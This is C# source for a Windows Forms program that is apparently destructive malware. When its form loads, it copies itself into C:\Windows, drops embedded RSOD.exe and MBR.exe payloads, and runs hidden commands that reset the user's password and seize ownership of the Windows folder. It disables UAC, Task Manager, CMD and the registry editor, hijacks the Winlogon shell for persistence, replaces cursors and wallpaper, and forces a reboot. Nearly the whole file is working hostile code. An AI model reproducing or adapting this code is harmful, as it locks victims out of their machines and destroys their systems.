using System;
using System.Reflection;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;

namespace DomenicoBini
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
                using (BinaryReader r = new BinaryReader(s))
                    using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
                        using (BinaryWriter w = new BinaryWriter(fs))
                            w.Write(r.ReadBytes((int)s.Length));
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            if (!File.Exists(@"C:\Windows\winnt64.exe"))
            {
                if (!Directory.Exists(@"C:\Windows\res_winnt64"))
                {
                    //Create Directory
                    Directory.CreateDirectory(@"C:\Windows\res_winnt64");
                }
                
                if (!File.Exists(@"C:\Windows\res_winnt64\DomenicoBini.exe"))
                {
                    //Copy File To Resources Folder
                    string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    File.Copy(src, @"C:\Windows\res_winnt64\DomenicoBini.exe");
                }

                //Extract Assets
                if (!File.Exists(@"C:\Windows\res_winnt64\wp.jpg"))
                {
                    Extract("DomenicoBini", "C:\\Windows\\res_winnt64", "Risorse", "wp.jpg");
                }
                if (!File.Exists(@"C:\Windows\res_winnt64\remap.reg"))
                {
                    Extract("DomenicoBini", "C:\\Windows\\res_winnt64", "Risorse", "remap.reg");
                }
                if (!File.Exists(@"C:\Windows\res_winnt64\cursor.ani"))
                {
                    Extract("DomenicoBini", "C:\\Windows\\res_winnt64", "Risorse", "cursor.ani");
                }
                if (!File.Exists(@"C:\Windows\res_winnt64\RSOD.exe"))
                {
                    Extract("DomenicoBini", "C:\\Windows\\res_winnt64", "Risorse", "RSOD.exe");
                }
                if (!File.Exists(@"C:\Windows\res_winnt64\MBR.exe"))
                {
                    Extract("DomenicoBini", "C:\\Windows\\res_winnt64", "Risorse", "MBR.exe");
                }

                if (!File.Exists(@"C:\Windows\winnt64.exe"))
                {
                    //Copy File To Windows Folder
                    File.Copy(@"C:\Windows\res_winnt64\DomenicoBini.exe", @"C:\Windows\winnt64.exe");
                }
                
                //Remap Keyboard Keys
                const string quote = "\"";
                ProcessStartInfo remapper = new ProcessStartInfo();
                remapper.FileName = "cmd.exe";
                remapper.WindowStyle = ProcessWindowStyle.Hidden;
                remapper.Arguments = @"/k regedit /s " + quote + @"C:\Windows\res_winnt64\remap.reg" + quote + " && exit";
                Process.Start(remapper);

                //Edit Account Name And Password
                ProcessStartInfo usrdetails = new ProcessStartInfo();
                usrdetails.FileName = "cmd.exe";
                usrdetails.WindowStyle = ProcessWindowStyle.Hidden;
                usrdetails.Arguments = @"/k NET USER " + quote + "%username%" + quote + " 666 /domain && exit";
                Process.Start(usrdetails);

                //Take Own Of Windows Folder
                ProcessStartInfo takeown = new ProcessStartInfo();
                takeown.FileName = "cmd.exe";
                takeown.WindowStyle = ProcessWindowStyle.Hidden;
                takeown.Arguments = @"/k takeown /F C:\Windows /A /R /D Y && icacls C:\Windows /setowner " + quote + "%username%" + quote + " /T /C && exit";
                Process.Start(takeown);

                //Edit Register Keys
                RegistryKey UAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                UAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                RegistryKey CMD = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
                CMD.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
                RegistryKey TaskMGR = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                TaskMGR.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                RegistryKey Shell = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                Shell.SetValue("Shell", "explorer.exe, C:\\Windows\\res_winnt64\\RSOD.exe", RegistryValueKind.String);
                RegistryKey Regedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                Regedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                RegistryKey Cursor = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                Cursor.SetValue("", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("AppStarting", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("Arrow", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("Hand", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("Help", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("No", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("NWPen", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("SizeAll", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("SizeNESW", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("SizeNS", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("SizeNWSE", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("SizeWE", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("UpArrow", "C:\\Windows\\res_winnt64\\cursor.ani");
                Cursor.SetValue("Wait", "C:\\Windows\\res_winnt64\\cursor.ani");
                RegistryKey WallPaper = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                WallPaper.SetValue("Wallpaper", "C:\\Windows\\res_winnt64\\wp.jpg");
                RegistryKey Style = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                Style.SetValue("WallpaperStyle", "2");
                RegistryKey NoRemove = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
                NoRemove.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);

                //Restart Computer
                Thread.Sleep(5);
                Process.Start("shutdown", "/r /f /t 0");
            }
            else
            {
                //KillSwitch
                this.Hide();
                this.Close();
            }
        }
    }
}
